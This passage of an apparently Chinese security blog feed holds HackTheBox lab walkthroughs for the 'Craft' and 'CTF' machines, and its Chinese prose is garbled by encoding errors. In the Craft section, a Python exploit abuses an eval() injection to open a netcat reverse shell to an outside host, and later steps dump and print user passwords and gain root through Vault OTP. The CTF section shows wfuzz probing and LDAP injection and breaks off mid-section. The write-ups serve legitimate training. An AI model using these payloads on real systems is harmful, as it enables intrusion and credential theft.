<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -A -Pn -T4 -p- 10.10.10.110</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-01 21:42 EDT</span><br><span class="line">Nmap scan report for 10.10.10.110</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65462 closed ports, 70 filtered ports</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)</span><br><span class="line">|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)</span><br><span class="line">|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)</span><br><span class="line">443&#x2F;tcp  open  ssl&#x2F;http nginx 1.15.8</span><br><span class="line">|_http-server-header: nginx&#x2F;1.15.8</span><br><span class="line">|_http-title: About</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;craft.htb&#x2F;organizationName&#x3D;Craft&#x2F;stateOrProvinceName&#x3D;NY&#x2F;countryName&#x3D;US</span><br><span class="line">| Not valid before: 2019-02-06T02:25:47</span><br><span class="line">|_Not valid after:  2020-06-20T02:25:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">6022&#x2F;tcp open  ssh      (protocol 2.0)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|_    SSH-2.0-Go</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port6022-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;5&#x2F;1%Time&#x3D;5EACD7D6%P&#x3D;x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,C,&quot;SSH-2\.0-Go\r\n&quot;);</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2030.05 seconds</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦è€ƒå¯Ÿ443ç«¯å£ç«™ç‚¹</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115042.png"  />
<p>å¯¼èˆªæ æœ‰ä¸¤ä¸ªç½‘é¡µé“¾æ¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav pull-right&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://api.craft.htb/api/&quot;</span>&gt;</span>API<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://gogs.craft.htb/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Git&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/Git-Icon-Black.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;20&quot;</span> <span class="attr">height</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æŠŠ<code>api.craft.htb</code>å’Œ<code>gogs.craft.htb</code>åŠ åˆ°<code>/etc/hosts</code>æ–‡ä»¶ä¸­ï¼Œå†è®¿é—®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115250.png" alt=""></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªREST APIæ¥å£Swaggeræ–‡æ¡£ï¼Œå•ç‹¬çš„ä¸€ä¸ªAPIæ–‡æ¡£æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨ä»·å€¼ï¼Œå†å»çœ‹çœ‹<code>gogs.craft.htb</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115509.png" alt=""></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªç±»ä¼¼GitHubçš„ä»£ç æ‰˜ç®¡å¹³å°ï¼Œé‡Œé¢æœ‰443ç«¯å£ç«™ç‚¹çš„æºä»£ç ï¼Œæ¥çœ‹çœ‹commitæäº¤å†å²ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503115623.png" alt=""></p>
<p>ä¸»è¦çœ‹ç¼–å·ä¸º <code>c414b16057</code> and <code>10e3ba4f0a</code>è¿™ä¸¤ä¸ªcommitsï¼Œå…¶ä¸­<code>c414b16057</code> ä»£ç æ‰§è¡Œæ¼æ´ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@@ -38,9 +38,13 @@ class BrewCollection(Resource):</span></span><br><span class="line">         <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">         Creates a new brew entry.</span></span><br><span class="line"><span class="string">         &quot;&quot;&quot;</span></span><br><span class="line">-</span><br><span class="line">-        create_brew(request.json)</span><br><span class="line">-        <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br><span class="line">+</span><br><span class="line">+        <span class="comment"># make sure the ABV value is sane.</span></span><br><span class="line">+        <span class="keyword">if</span> eval(<span class="string">&#x27;%s &gt; 1&#x27;</span> % request.json[<span class="string">&#x27;abv&#x27;</span>]):</span><br><span class="line">+            <span class="keyword">return</span> <span class="string">&quot;ABV must be a decimal value less than 1.0&quot;</span>, <span class="number">400</span></span><br><span class="line">+        <span class="keyword">else</span>:</span><br><span class="line">+            create_brew(request.json)</span><br><span class="line">+            <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br><span class="line"><span class="meta"> @ns.route(&#x27;/&lt;int:id&gt;&#x27;)</span></span><br><span class="line"><span class="meta"> @api.response(404, &#x27;Brew not found.&#x27;)</span></span><br></pre></td></tr></table></figure>
<p><code>10e3ba4f0a</code>æœ‰ä¸€å¤„ä»£ç æ³„éœ²ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/login&#x27;</span>,  auth=(<span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>), verify=<span class="literal">False</span>)</span><br><span class="line">+json_response = json.loads(response.text)</span><br><span class="line">+token =  json_response[<span class="string">&#x27;token&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨æ€è·¯ï¼šç”¨å‡­è¯<code>dinesh: 4aUh0A8PbVJxgd</code>ç™»å½•<code>api.craft.htb/api/auth/login</code>ï¼Œç„¶åå†åˆ©ç”¨ä»£ç æ‰§è¡Œæ¼æ´å†™å…¥åå¼¹shellï¼Œshow codeï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/login&#x27;</span>,  auth=(<span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>), verify=<span class="literal">False</span>)</span><br><span class="line">json_response = json.loads(response.text)</span><br><span class="line">token =  json_response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123; <span class="string">&#x27;X-Craft-API-Token&#x27;</span>: token, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure token is valid</span></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/check&#x27;</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Create bogus ABV brew&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.43 1234 &gt;/tmp/f&#x27;)&quot;</span></span><br><span class="line">brew_dict = &#123;&#125;</span><br><span class="line">brew_dict[<span class="string">&#x27;abv&#x27;</span>] = payload + <span class="string">&#x27;| 0.15&#x27;</span></span><br><span class="line">brew_dict[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;exp&#x27;</span></span><br><span class="line">brew_dict[<span class="string">&#x27;brewer&#x27;</span>] = <span class="string">&#x27;exp&#x27;</span></span><br><span class="line">brew_dict[<span class="string">&#x27;style&#x27;</span>] = <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">json_data = json.dumps(brew_dict)</span><br><span class="line">response = requests.post(<span class="string">&#x27;https://api.craft.htb/api/brew/&#x27;</span>, headers=headers, data=json_data, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p>ä¸»æœºç›‘å¬1234ç«¯å£ï¼ŒæˆåŠŸåå¼¹shellã€‚</p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;opt&#x2F;app # cd &#x2F;</span><br><span class="line">&#x2F; # ls -la</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..</span><br><span class="line">-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jan  3 17:20 bin</span><br><span class="line">drwxr-xr-x    5 root     root           340 Jan  3 14:58 dev</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 home</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib</span><br><span class="line">drwxr-xr-x    5 root     root          4096 Jan 30  2019 media</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt</span><br><span class="line">dr-xr-xr-x  238 root     root             0 Jan  3 14:58 proc</span><br><span class="line">drwx------    1 root     root          4096 Jan  3 15:16 root</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 run</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv</span><br><span class="line">dr-xr-xr-x   13 root     root             0 Jan  3 14:58 sys</span><br><span class="line">drwxrwxrwt    1 root     root          4096 Jan  3 17:26 tmp</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jan 30  2019 var</span><br><span class="line">&#x2F; #</span><br></pre></td></tr></table></figure>
<p>ç»“æœå‘ç°å¹¶æ²¡æœ‰æ‹¿åˆ°é¶æœºçš„shellï¼Œè€Œæ˜¯ä¸€ä¸ªdockeré•œåƒçš„shellã€‚</p>
<p>å‘ç°åœ¨é¡¹ç›®çš„ä¸»ç›®å½•<code>/opt/app</code>æœ‰ä¸€ä¸ª<code>dbtest.py</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import pymysql</span><br><span class="line">from craft_api import settings</span><br><span class="line"></span><br><span class="line"># test connection to mysql database</span><br><span class="line"></span><br><span class="line">connection &#x3D; pymysql.connect(host&#x3D;settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user&#x3D;settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password&#x3D;settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db&#x3D;settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass&#x3D;pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line">try: </span><br><span class="line">    with connection.cursor() as cursor:</span><br><span class="line">        sql &#x3D; &quot;SELECT &#96;id&#96;, &#96;brewer&#96;, &#96;name&#96;, &#96;abv&#96; FROM &#96;brew&#96; LIMIT 1&quot;</span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result &#x3D; cursor.fetchone()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line">finally:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ­¤æ—¶mysqlå‘½ä»¤åŒæ ·ä¸èƒ½ä½¿ç”¨ã€‚</p>
</blockquote>
<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬ä»gogsä»“åº“çš„ä»£ç ä¸­ï¼Œå¾—çŸ¥æ•°æ®åº“ä¸­åº”è¯¥æœ‰ä¸¤å¼ è¡¨ï¼š<code>brew</code>å’Œ<code>user</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¨¡ä»¿<code>dbtest.py</code>é‡æ–°å†™ä¸€ä¸ªæŸ¥è¯¢è¯­å¥dumpæ‰€æœ‰çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># test connection to mysql database</span></span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">&quot;SELECT `username`, `password` FROM `user`&quot;</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure>
<p>æ‰€æœ‰ç”¨æˆ·ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;username&#x27;: &#x27;dinesh&#x27;, &#x27;password&#x27;: &#x27;4aUh0A8PbVJxgd&#x27;&#125;, </span><br><span class="line">&#123;&#x27;username&#x27;: &#x27;ebachman&#x27;, &#x27;password&#x27;: &#x27;llJ77D8QFkLPQB&#x27;&#125;, </span><br><span class="line">&#123;&#x27;username&#x27;: &#x27;gilfoyle&#x27;, &#x27;password&#x27;: &#x27;ZEU3N8WNM2rh4T&#x27;&#125;</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡å°è¯•ï¼Œè¿™å‡ ä¸ªå¯†ç å¹¶ä¸æ˜¯SSHçš„ç™»å½•å¯†ç ï¼Œå®åœ¨æ²¡æ€è·¯äº†å»çœ‹äº†ä¸€çœ¼Writeupï¼Œ<code>gilfoyle</code>æœ‰ä¸€ä¸ªç§æœ‰ä»“åº“<code>craft-infra</code>ï¼Œå¹¶ä¸”ä»“åº“ä»£ç ä¸­æ³„éœ²äº†SSHçš„private keyï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503141140.png" alt=""></p>
<p>å¹¶ä¸”è¿™ä¸ªprivate keyæœ‰å¯†ç ä¿æŠ¤ï¼Œä½†æ˜¯è¿™ä¸ªå¯†ç å’Œ<code>gilfoyle</code>çš„gogså¯†ç ç›¸åŒï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200503141425.png" alt=""></p>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>ç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>.vault_key</code>æ–‡ä»¶ï¼ŒGoogleä¸€ä¸‹</p>
<blockquote>
<p>Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API.</p>
</blockquote>
<p>æ ¹æ®https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwordsè¿™ç¯‡æ–‡æ¡£ï¼Œå†ç»“åˆ<code>craft-infra</code>ä»“åº“ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹<code>vault</code>ä¸­çš„<code>secrets.sh</code>æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨vaultå‘½ä»¤ç™»å½•SSHï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1</span><br><span class="line">Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed</span><br><span class="line">below. Enter this code in the SSH password prompt. If you install sshpass,</span><br><span class="line">Vault can automatically perform this step for you.</span><br><span class="line">OTP for the session is: a66d769f-f1e3-e3bd-9b52-2cfb7edcd85b</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™æ ·è¯´èµ·æ¥ææƒè¿‡ç¨‹å¥½åƒæ¯”è¾ƒç®€çŸ­ï¼Œä½†æ˜¯åšèµ·æ¥è¦èŠ±ä¸å°‘çš„åŠŸå¤«ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::CTF_walkthrough</title>
    <url>/Target_drone/HackTheBox/17.HTB-CTF-walkthrough/</url>
    <content><![CDATA[<h1 id="HackTheBox-CTF-Walkthrough">HackTheBox::CTF Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<table>
<thead>
<tr>
<th>Column</th>
<th>Details</th>
</tr>
</thead>
<tbody>
<tr>
<td>Name</td>
<td>CTF</td>
</tr>
<tr>
<td>IP</td>
<td>10.10.10.122</td>
</tr>
<tr>
<td>Points</td>
<td>50</td>
</tr>
<tr>
<td>OS</td>
<td>Linux</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Insane</td>
</tr>
<tr>
<td>Creator</td>
<td>0xEA31</td>
</tr>
</tbody>
</table>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>Python Scripting</li>
<li>LDAP Injection</li>
<li>Wildcard and Symlink abuse</li>
</ul>
<h2 id="0x03-Initial-Enumeration">0x03 Initial Enumeration</h2>
<p>Nmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</span><br><span class="line">Nmap scan report for ctf.htb (10.10.10.122)</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</span><br><span class="line">|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</span><br><span class="line">|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹80ç«¯å£</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710145257.png" alt=""></p>
<p>å¤§æ¦‚çš„æ„æ€å°±æ˜¯è®©æˆ‘ä»¬å°è¯•å»ç™»å½•è¿™ä¸ªç³»ç»Ÿï¼Œä½†æ˜¯ä¸èƒ½ç”¨SQLmapæˆ–è€…Dirbusterå»æš´åŠ›çŒœè§£ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p>å†å»ç™»å½•ç•Œé¢çœ‹ä¸€ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710153946.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬æ˜¯ä¸€ä¸ªOTPï¼ŒåŠOne Time Passwordï¼Œä¸€èˆ¬è€Œè¨€æ˜¯1åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡ã€‚</p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªHint</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154051.png" alt=""></p>
<blockquote>
<p>å¦‚æœæ¯”è¾ƒç†Ÿæ‚‰LDAPçš„è¯ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªåè¯schemaå’Œattributeå·²ç»æç¤ºäº†æ˜¯å…³äºLDAPæ³¨å…¥ã€‚</p>
</blockquote>
<p>é¶æœºä½œè€…ç”¨ä¸€ä¸ªå·²çŸ¥çš„å±æ€§å»å­˜å‚¨äº†81ä½çš„token stringï¼ŒGoogleæœä¸€ä¸‹<code>token string (81 digits)</code>ã€‚</p>
<blockquote>
<p><a href="https://www.systutorials.com/docs/linux/man/1-stoken/">https://www.systutorials.com/docs/linux/man/1-stoken/</a></p>
</blockquote>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154249.png" style="zoom: 67%;" />
<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œ<code>Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings</code>ï¼Œå’Œé¶æœºçš„é¢˜ç›®ç›¸å¥‘åˆï¼Œç°åœ¨å°±æœ‰ä¸€ç‚¹æ€è·¯äº†ï¼Œåº”è¯¥è¦å»æ‰¾åˆ°è¿™ä¸ª81ä½çº¯æ•°å­—çš„tokenï¼Œç„¶åç”¨stokenå·¥å…·å»ç”ŸæˆOTPã€‚ç°åœ¨å°±ä¸»è¦æ˜¯æ‰¾åˆ°tokenï¼Œå”¯ä¸€å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªç™»å½•æ¡†äº†ã€‚</p>
<p>å…ˆéšä¾¿ç”¨æŸä¸ªç”¨æˆ·åå’Œå¯†ç ç™»å½•<code>admin:1234</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164835.png" alt=""></p>
<p>è¿”å›<code>User admin not found</code>ï¼Œå†ç”¨SQLæ³¨å…¥çš„ä¸‡èƒ½å¯†ç è¯•ä¸€è¯•</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164644.png" alt=""></p>
<p>ç›´æ¥æ˜¯æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåº”è¯¥æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦æœ‰é»‘åå•è¿‡æ»¤ã€‚Fuzzä¸€ä¸‹è¿‡æ»¤äº†ä¸€äº›ä»€ä¹ˆå­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710165335.png" alt=""></p>
<blockquote>
<p>â€“hw 233 ä»£è¡¨è¿‡æ»¤æ‰å½¢å¦‚<code>User xxx not found</code>çš„è¿”å›ä¿¡æ¯ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬å‘ç°<code>+</code>å’Œ<code>&amp;</code>è¿”å›çš„æ˜¯232 Wordsï¼Œä½†æ˜¯åœ¨é¡µé¢æµ‹è¯•ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710173607.png" alt=""></p>
<p>å‘ç°è¿”å›çš„è¿˜æ˜¯<code>User + not found</code>æˆ–è€…<code>User &amp; not found</code>ï¼Œè¿™æ ·çš„è¯åº”è¯¥æ˜¯233 Wordsï¼Œè€Œä¸æ˜¯Wfuzzè¿”å›çš„232 Wordsã€‚</p>
<p>æˆ‘ä»¬å°è¯•æŠŠè¿™äº›ç‰¹æ®Šå­—ç¬¦äºŒæ¬¡URLç¼–ç ï¼Œçœ‹Webåº”ç”¨æ˜¯å¦è¿˜èƒ½è§£æï¼Œç”¨seclistsä¸­çš„doble_uri_hex.txtä½œä¸ºå­—å…¸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710193655.png" alt=""></p>
<p>æœ€åFuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%2500 ---&gt; %00</span><br><span class="line">%2528 ---&gt; (</span><br><span class="line">%2529 ---&gt; )</span><br><span class="line">%252a ---&gt; *</span><br><span class="line">%255c ---&gt; \</span><br></pre></td></tr></table></figure>
<p>è¿™äº›è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯LDAPæ³¨å…¥éœ€è¦è¿‡æ»¤çš„æ‰€æœ‰å­—ç¬¦ï¼Œå†ç»“åˆ<code>login.php</code>é¡µé¢æºä»£ç ä¸­çš„hintï¼Œå¯ä»¥ç¡®å®šæ˜¯LDAPæ³¨å…¥ã€‚</p>
<h2 id="0x04-Getting-User-Access">0x04 Getting User Access</h2>
<p>å…ˆæ¥çœ‹LDAPæ³¨å…¥çš„æœ€åŸºæœ¬å½¢å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(password&#x3D;1234)</span><br><span class="line">	(uid&#x3D;ca01h%00)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>å…·ä½“åˆ°è¿™ä¸ªé¶æœºçš„è¯ï¼Œæˆ‘ä»¬éœ€è¦çŒœè§£æ‹¬å·çš„ä¸ªæ•°ã€‚è¿ç”¨ç±»ä¼¼ç›²æ³¨çš„æ€æƒ³ï¼Œå¦‚æœæ³¨å…¥æˆåŠŸï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›<code>User ca01h not found</code>ã€‚</p>
<p>å‡è®¾åªæœ‰ä¸€ä¸ªæ‹¬å·ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202659.png" alt=""></p>
<p>å‡è®¾æœ‰ä¸¤ä¸ªæ‹¬å·ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202740.png" alt=""></p>
<p>å‡è®¾æœ‰ä¸‰ä¸ªæ‹¬å·ï¼š</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710202913036.png" alt="image-20200710202913036"></p>
